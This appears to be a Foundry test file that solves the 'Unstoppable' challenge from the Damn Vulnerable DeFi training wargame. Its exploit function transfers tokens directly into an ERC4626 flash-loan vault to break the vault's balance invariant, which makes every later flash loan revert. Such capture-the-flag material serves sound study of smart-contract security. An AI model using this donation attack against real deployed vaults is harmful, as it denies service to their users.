// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utilities} from "./utils/Utilities.sol";
import "dvd-v3/DamnValuableToken.sol";
import "dvd-v3/unstoppable/UnstoppableVault.sol";
import "dvd-v3/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    address internal deployer;
    address internal attacker;
    address internal someUser;

    Utilities internal utils;

    DamnValuableToken internal dvt;
    UnstoppableVault internal usv;
    ReceiverUnstoppable internal rus;

    function setUp() public {
        utils = new Utilities();
	    address [] memory actors = utils.setUp();
        deployer = actors[0];
        attacker = actors[1];
        someUser = actors[2];


        vm.startPrank(deployer);

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "Token");
        usv = new UnstoppableVault(dvt, address(deployer), address(deployer));
        vm.label(address(usv), "Vault");
        // check that the vault has been set up with correct token
        assertEq(address(usv.asset()), address(dvt));

        // approving the vault (sender) to spend the dev tokens
        dvt.approve(address(usv), TOKENS_IN_VAULT);
        usv.deposit(TOKENS_IN_VAULT, address(deployer));

        // checks that accounting methods functioning as expected after transfer
        // checks that fee calculation is functioning as expected
        assertEq(uint256(dvt.balanceOf(address(usv))), TOKENS_IN_VAULT);
        assertEq(uint256(usv.totalAssets()), TOKENS_IN_VAULT);
        assertEq(uint256(usv.totalSupply()), TOKENS_IN_VAULT);
        assertEq(uint256(usv.maxFlashLoan(address(dvt))), TOKENS_IN_VAULT);
        assertEq(uint256(usv.flashFee(address(dvt), TOKENS_IN_VAULT- 1)), uint256(0));
        assertEq(uint256(usv.flashFee(address(dvt), TOKENS_IN_VAULT)), uint256(50000e18));

        dvt.transfer(address(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
        assertEq(uint256(dvt.balanceOf(address(attacker))), INITIAL_ATTACKER_TOKEN_BALANCE);
        vm.stopPrank();

        vm.startPrank(someUser);
        rus = new ReceiverUnstoppable(address(usv));
        rus.executeFlashLoan(100e18);
        vm.stopPrank();
    }

    function test_StoryUnstoppable() public view {
        console2.log("~~~~~~~~~~~~~~~~");
        console2.log("the dev has awoken...");
        console2.log("the dev deploys his new ERC20 token and accompanying ERC4626 vault");
        console2.log("the token: %s", address(dvt));
        console2.log("the vault: %s", address(usv));
        console2.log("~~~~~~~~~~~~~~~");
        console2.log("The dev then transfers a share of their tokens to the vault and some to you to test out the functionality...");
        console2.log("balance of the vault: %s DVT", uint256(dvt.balanceOf(address(usv)))/1e18);
        console2.log("balance of you: %s DVT", uint256(dvt.balanceOf(address(attacker))/1e18));
        console2.log("Try and break the contract... after you are done flashloans cannot be offered");
        console2.log("Edit the method test_ExpoloitUnstoppable");
    }

    function test_ExploitUnstoppable() public {
        console2.log("~~~~~~~~Prior to attack~~~~~~~~~");
        console2.log("balance of vault according to ERC20 token: %s", dvt.balanceOf(address(usv))/1e18);
        console2.log("balance of vault according to internal logic: %s", usv.convertToShares(usv.totalSupply())/1e18);
        vm.startPrank(attacker);
        // crux of the problem is breaking invariant such that convertToShares(totalSupply) != balanceBefore
        // => balanceBefore = totalAssets()
        // => totalAssets() = assset.balanceOf(address(this))
        dvt.transfer(address(usv), INITIAL_ATTACKER_TOKEN_BALANCE);
        vm.stopPrank();
        console2.log("~~~~~~~~~Post attack~~~~~~~~~~~");
        console2.log("balance of vault according to ERC20 token: %s", dvt.balanceOf(address(usv))/1e18);
        uint256 convertToShares = usv.convertToShares(usv.totalSupply())/1e18;
        console2.log("balance of vault according to internal logic: %s", convertToShares);
        validation();
    }

    function validation() public {
        vm.startPrank(someUser);
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        rus.executeFlashLoan(10);
        vm.stopPrank();
    }
}
